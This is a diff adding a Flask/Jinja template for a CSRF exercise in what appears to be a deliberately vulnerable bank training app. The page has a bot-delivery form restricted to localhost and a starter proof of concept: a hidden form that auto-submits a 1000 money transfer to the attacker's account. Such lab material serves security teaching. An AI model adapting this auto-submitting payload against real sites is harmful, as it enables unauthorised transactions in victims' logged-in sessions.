@@ -1,0 +1,41 @@
+{% extends "base.html" %}
+{% block title %}CSRF Lab - Learn2Pwn Bank{% endblock %}
+{% block content %}
+<section class="card">
+  <h1>CSRF lab: deliver an exploit to the victim</h1>
+  <p class="muted">
+    Nora Kessler is logged into her online banking right now, in another tab - current balance
+    <strong>{{ nora_balance | money }}</strong>. You don't have her password and never will. Get her
+    browser to do something for you instead.
+  </p>
+  <form method="post" action="{{ url_for('csrf_lab_run_bot') }}">
+    <label>URL of your exploit page (must be on localhost / 127.0.0.1)
+      <input name="url" value="{{ last_url }}" placeholder="http://127.0.0.1:8000/exploit.html" required>
+    </label>
+    <button type="submit">Deliver to victim</button>
+  </form>
+  {% if report %}
+  <div class="alert alert-{{ 'ok' if report.ok else 'error' }}">
+    {% for line in report.log %}<div>{{ line }}</div>{% endfor %}
+  </div>
+  {% endif %}
+</section>
+
+<section class="card">
+  <h2>Starter PoC</h2>
+  <p class="muted">
+    Save this as <code>exploit.html</code> in an empty folder, change <code>YOUR_USERNAME_HERE</code> to
+    your own username, then from that folder run
+    <code>python3 -m http.server 8000</code> and paste
+    <code>http://127.0.0.1:8000/exploit.html</code> above.
+  </p>
+  <pre><code>&lt;!-- auto-submitting CSRF PoC --&gt;
+&lt;form id="csrf-form" action="{{ url_for('transfer', _external=True) }}" method="POST"&gt;
+  &lt;input type="hidden" name="to" value="YOUR_USERNAME_HERE"&gt;
+  &lt;input type="hidden" name="amount" value="1000"&gt;
+  &lt;input type="hidden" name="memo" value="gift"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById("csrf-form").submit();&lt;/script&gt;</code></pre>
+</section>
+<p><a href="{{ url_for('dashboard') }}">&larr; Back to dashboard</a></p>
+{% endblock %}
